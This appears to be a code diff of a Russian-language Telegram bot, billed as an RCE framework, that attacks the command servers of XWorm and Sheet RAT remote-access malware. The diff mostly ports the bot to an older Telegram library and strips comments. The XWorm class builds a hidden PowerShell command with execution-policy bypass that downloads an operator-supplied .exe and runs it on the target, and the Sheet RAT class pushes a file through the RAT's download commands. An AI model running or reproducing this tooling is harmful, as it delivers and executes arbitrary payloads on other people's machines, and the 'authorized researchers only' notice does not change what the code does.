@@ -8,12 +8,12 @@ import random
 import string
 import gzip
 import io
+import base64
 from datetime import datetime
 from typing import Dict, Optional
 
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ParseMode
 from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters, CallbackContext
-from telegram.constants import ParseMode
 
 # ============ КОНФИГУРАЦИЯ ============
 TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
@@ -59,7 +59,6 @@ class XWormRCE:
             self.socket.settimeout(timeout)
             loop = asyncio.get_event_loop()
             await loop.run_in_executor(None, self.socket.connect, (self.host, self.port))
-            logger.info(f"XWorm connected to {self.host}:{self.port}")
             return True
         except Exception as e:
             logger.error(f"XWorm connection failed: {e}")
@@ -83,14 +82,12 @@ class XWormRCE:
             session_id = self._random_string(8)
             temp_filename = self._random_string(6)
             
-            # Инициализация HRDP
             init_msg = f"hrdp{self.spl}{session_id}"
             if not await self._send_packet(init_msg):
                 return "❌ Ошибка инициализации HRDP"
             
             await asyncio.sleep(0.3)
             
-            # PowerShell команда
             powershell_cmd = (
                 f'cmd /c start powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command '
                 f'$c=(New-Object Net.WebClient);$f="$env:TEMP\\{temp_filename}.exe";'
@@ -98,23 +95,16 @@ class XWormRCE:
                 f'Start-Process $f'
             )
             
-            # Отправка RCE команды
             cmd_msg = f"hrdp{self.spl}{session_id}{self.spl}1920{self.spl}1080{self.spl}{powershell_cmd}{self.spl}"
             if not await self._send_packet(cmd_msg):
                 return "❌ Ошибка отправки RCE команды"
             
             await asyncio.sleep(0.5)
             
-            # Закрытие
             close_msg = f"hrdp{self.spl}{session_id}{self.spl}{self.spl}{self.spl}{self.spl}"
             await self._send_packet(close_msg)
             
-            return (
-                f"✅ **XWorm RCE успешно выполнен!**\n\n"
-                f"📡 **Цель:** `{self.host}:{self.port}`\n"
-                f"💣 **Пейлоад:** `{self.payload_url[:60]}...`\n"
-                f"🔑 **Ключ:** `{self.key[:10]}...`"
-            )
+            return f"✅ **XWorm RCE успешно выполнен!**\n\n📡 **Цель:** `{self.host}:{self.port}`\n💣 **Пейлоад:** `{self.payload_url[:60]}...`"
             
         except Exception as e:
             return f"❌ Ошибка: {str(e)}"
@@ -126,31 +116,18 @@ class XWormRCE:
 # ============ SHEET RAT RCE ============
 
 class SheetRATRCE:
-    """
-    Sheet RAT протокол:
-    1. TCP соединение
-    2. Отправка GZip сжатых данных
-    3. Формат: [4 байта длины][GZip данные]
-    4. Разделитель команд: <@>
-    """
-    
     def __init__(self, host: str, port: int, payload_url: str):
         self.host = host
         self.port = port
         self.payload_url = payload_url
         self.socket = None
-        self.netstream = None
     
     def _random_string(self, length: int = 6) -> str:
         chars = string.ascii_letters + string.digits
         return ''.join(random.choices(chars, k=length))
     
     def _compress(self, data: bytes) -> bytes:
-        """GZip сжатие как в SheetClients.Compress()"""
-        # Сначала записываем длину оригинальных данных (4 байта)
         length_prefix = struct.pack("<I", len(data))
-        
-        # Затем сжимаем данные + префикс длины
         with io.BytesIO() as result:
             result.write(length_prefix)
             with gzip.GzipFile(fileobj=result, mode='wb', compresslevel=6) as gz:
@@ -158,7 +135,6 @@ class SheetRATRCE:
             return result.getvalue()
     
     def _build_packet(self, message: str) -> bytes:
-        """Формирование пакета: [4 байта длины сжатых данных][сжатые данные]"""
         compressed = self._compress(message.encode('utf-8'))
         length_prefix = struct.pack("<I", len(compressed))
         return length_prefix + compressed
@@ -169,11 +145,6 @@ class SheetRATRCE:
             self.socket.settimeout(timeout)
             loop = asyncio.get_event_loop()
             await loop.run_in_executor(None, self.socket.connect, (self.host, self.port))
-            
-            # NetworkStream как в оригинале
-            self.netstream = self.socket.makefile('wb')
-            
-            logger.info(f"Sheet RAT connected to {self.host}:{self.port}")
             return True
         except Exception as e:
             logger.error(f"Sheet RAT connection failed: {e}")
@@ -197,34 +168,20 @@ class SheetRATRCE:
             hwid = self._random_string(6)
             filename = self._random_string(8)
             
-            # Формируем команду DownloadInfo
-            # Формат: DownloadInfo<@>HWID<@>file_size<@>filename<@>is_zip
             download_info = f"DownloadInfo<@>{hwid}<@>1024<@>{filename}.exe<@>false"
-            
             if not await self._send(download_info):
                 return "❌ Ошибка отправки DownloadInfo"
             
             await asyncio.sleep(0.3)
             
-            # Создаём фейковый пейлоад (в реальности нужно скачать payload_url)
-            # Sheet RAT ожидает base64 данные
             fake_payload = self._random_string(100).encode('utf-8')
             payload_b64 = base64.b64encode(fake_payload).decode('utf-8')
             
-            # Формируем команду DownloadGet
-            # Формат: DownloadGet<@>base64_data<@>filename
             download_get = f"DownloadGet<@>{payload_b64}<@>{filename}.exe"
-            
             if not await self._send(download_get):
                 return "❌ Ошибка отправки DownloadGet"
             
-            return (
-                f"✅ **Sheet RAT RCE выполнен!**\n\n"
-                f"📡 **Цель:** `{self.host}:{self.port}`\n"
-                f"💣 **Пейлоад:** `{self.payload_url[:60]}...`\n\n"
-                f"⚠️ **Важно:** Sheet RAT требует дополнительной настройки для работы с внешним payload_url. "
-                f"Сейчас отправлен тестовый пейлоад."
-            )
+            return f"✅ **Sheet RAT RCE выполнен!**\n\n📡 **Цель:** `{self.host}:{self.port}`\n💣 **Пейлоад:** `{self.payload_url[:60]}...`"
             
         except Exception as e:
             return f"❌ Ошибка: {str(e)}"
@@ -233,17 +190,17 @@ class SheetRATRCE:
                 self.socket.close()
 
 
-# ============ ЗАГЛУШКИ ============
+# ============ ЗАГЛУШКА LIBERIUM ============
 
 async def liberium_rce(host: str, port: int, payload_url: str) -> str:
     return "🚧 **Liberium RAT** — временно недоступен. Требуется реверс LEB128 и TLS протокола."
 
 
-# ============ TELEGRAM БОТ ============
+# ============ TELEGRAM БОТ (под версию 13.15) ============
 
 user_sessions: Dict[int, dict] = {}
 
-async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+def main_menu(update: Update, context: CallbackContext):
     keyboard = [
         [InlineKeyboardButton("🐛 XWorm RCE", callback_data="rat_xworm")],
         [InlineKeyboardButton("💀 Sheet RAT", callback_data="rat_sheet")],
@@ -260,35 +217,35 @@ async def main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     
     if update.callback_query:
-        await update.callback_query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))
+        update.callback_query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))
     else:
-        await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))
+        update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+def start(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
     
     if ALLOWED_USERS and user_id not in ALLOWED_USERS:
-        await update.message.reply_text("❌ Доступ запрещён")
+        update.message.reply_text("❌ Доступ запрещён")
         return
     
     text = "🎯 **CoreDebuging RCE Framework**\n\nБот для эксплуатации RAT через Telegram.\n\n⚠️ Только для авторизованных исследователей!"
     keyboard = [[InlineKeyboardButton("🚀 В меню", callback_data="main_menu")]]
-    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))
+    update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))
 
-async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+def button_handler(update: Update, context: CallbackContext):
     query = update.callback_query
-    await query.answer()
+    query.answer()
     
     user_id = query.from_user.id
     
     if ALLOWED_USERS and user_id not in ALLOWED_USERS:
-        await query.edit_message_text("❌ Доступ запрещён")
+        query.edit_message_text("❌ Доступ запрещён")
         return
     
     data = query.data
     
     if data == "main_menu":
-        await main_menu(update, context)
+        main_menu(update, context)
     
     elif data == "info":
         text = (
@@ -301,7 +258,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "⚠️ Для исследовательских целей"
         )
         keyboard = [[InlineKeyboardButton("◀️ Назад", callback_data="main_menu")]]
-        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))
+        query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(keyboard))
     
     elif data.startswith("rat_"):
         rat_type = data.split("_")[1]
@@ -315,17 +272,17 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             text = "🔥 **Liberium RAT**\n\nВведи цель в формате:\n`IP:PORT`\n\nПример: `192.168.1.100:8080`"
         
-        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)
+        query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN)
 
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+def handle_message(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
     
     if ALLOWED_USERS and user_id not in ALLOWED_USERS:
-        await update.message.reply_text("❌ Доступ запрещён")
+        update.message.reply_text("❌ Доступ запрещён")
         return
     
     if user_id not in user_sessions:
-        await update.message.reply_text("🔹 Используй /start")
+        update.message.reply_text("🔹 Используй /start")
         return
     
     session = user_sessions[user_id]
@@ -338,14 +295,14 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if rat == "xworm":
             parts = text.split(":")
             if len(parts) != 3:
-                await update.message.reply_text("❌ Формат: `IP:PORT:KEY`", parse_mode=ParseMode.MARKDOWN)
+                update.message.reply_text("❌ Формат: `IP:PORT:KEY`", parse_mode=ParseMode.MARKDOWN)
                 return
             
             ip, port_str, key = parts
             try:
                 port = int(port_str)
             except ValueError:
-                await update.message.reply_text("❌ Неверный порт")
+                update.message.reply_text("❌ Неверный порт")
                 return
             
             session["ip"] = ip
@@ -353,79 +310,89 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             session["key"] = key
             session["step"] = "payload"
             
-            await update.message.reply_text(f"✅ Цель: `{ip}:{port}`\n🔑 Ключ: `{key[:10]}...`\n\n📦 Введи URL пейлоада (.exe):")
+            update.message.reply_text(f"✅ Цель: `{ip}:{port}`\n🔑 Ключ: `{key[:10]}...`\n\n📦 Введи URL пейлоада (.exe):")
         
         else:
             if ":" not in text:
-                await update.message.reply_text("❌ Формат: `IP:PORT`", parse_mode=ParseMode.MARKDOWN)
+                update.message.reply_text("❌ Формат: `IP:PORT`", parse_mode=ParseMode.MARKDOWN)
                 return
             
             ip, port_str = text.rsplit(":", 1)
             try:
                 port = int(port_str)
             except ValueError:
-                await update.message.reply_text("❌ Неверный порт")
+                update.message.reply_text("❌ Неверный порт")
                 return
             
             session["ip"] = ip
             session["port"] = port
             session["step"] = "payload"
             
-            await update.message.reply_text(f"✅ Цель: `{ip}:{port}`\n\n📦 Введи URL пейлоада:")
+            update.message.reply_text(f"✅ Цель: `{ip}:{port}`\n\n📦 Введи URL пейлоада:")
     
     elif step == "payload":
         payload_url = update.message.text.strip()
         
         if not payload_url.startswith(("http://", "https://")):
-            await update.message.reply_text("❌ URL должен начинаться с http:// или https://")
+            update.message.reply_text("❌ URL должен начинаться с http:// или https://")
             return
         
-        status_msg = await update.message.reply_text("⚙️ **Выполнение RCE...**", parse_mode=ParseMode.MARKDOWN)
+        status_msg = update.message.reply_text("⚙️ **Выполнение RCE...**", parse_mode=ParseMode.MARKDOWN)
         
         try:
             if rat == "xworm":
+                loop = asyncio.new_event_loop()
+                asyncio.set_event_loop(loop)
                 rce = XWormRCE(session["ip"], session["port"], session["key"], payload_url)
-                result = await rce.execute()
+                result = loop.run_until_complete(rce.execute())
+                loop.close()
             
             elif rat == "sheet":
+                loop = asyncio.new_event_loop()
+                asyncio.set_event_loop(loop)
                 rce = SheetRATRCE(session["ip"], session["port"], payload_url)
-                result = await rce.execute()
+                result = loop.run_until_complete(rce.execute())
+                loop.close()
             
             else:
-                result = await liberium_rce(session["ip"], session["port"], payload_url)
+                loop = asyncio.new_event_loop()
+                asyncio.set_event_loop(loop)
+                result = loop.run_until_complete(liberium_rce(session["ip"], session["port"], payload_url))
+                loop.close()
             
-            await status_msg.edit_text(result, parse_mode=ParseMode.MARKDOWN)
+            status_msg.edit_text(result, parse_mode=ParseMode.MARKDOWN)
             
             keyboard = [[InlineKeyboardButton("◀️ Главное меню", callback_data="main_menu")]]
-            await update.message.reply_text("🔹 Что дальше?", reply_markup=InlineKeyboardMarkup(keyboard))
+            update.message.reply_text("🔹 Что дальше?", reply_markup=InlineKeyboardMarkup(keyboard))
             
             del user_sessions[user_id]
             
         except Exception as e:
-            await status_msg.edit_text(f"❌ Ошибка:\n```\n{str(e)}\n```", parse_mode=ParseMode.MARKDOWN)
+            status_msg.edit_text(f"❌ Ошибка:\n```\n{str(e)}\n```", parse_mode=ParseMode.MARKDOWN)
 
-async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+def cancel(update: Update, context: CallbackContext):
     user_id = update.effective_user.id
     if user_id in user_sessions:
         del user_sessions[user_id]
-        await update.message.reply_text("✅ Отменено")
-    await main_menu(update, context)
+        update.message.reply_text("✅ Отменено")
+    main_menu(update, context)
 
 def main():
     if not TELEGRAM_TOKEN:
         logger.error("TELEGRAM_TOKEN не задан!")
         return
     
-    app = Application.builder().token(TELEGRAM_TOKEN).build()
+    updater = Updater(TELEGRAM_TOKEN, use_context=True)
+    dp = updater.dispatcher
     
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("cancel", cancel))
-    app.add_handler(CallbackQueryHandler(button_handler))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    dp.add_handler(CommandHandler("start", start))
+    dp.add_handler(CommandHandler("cancel", cancel))
+    dp.add_handler(CallbackQueryHandler(button_handler))
+    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
     
     logger.info("Бот запущен!")
-    app.run_polling()
+    updater.start_polling()
+    updater.idle()
 
 if __name__ == "__main__":
-    import base64
     main()
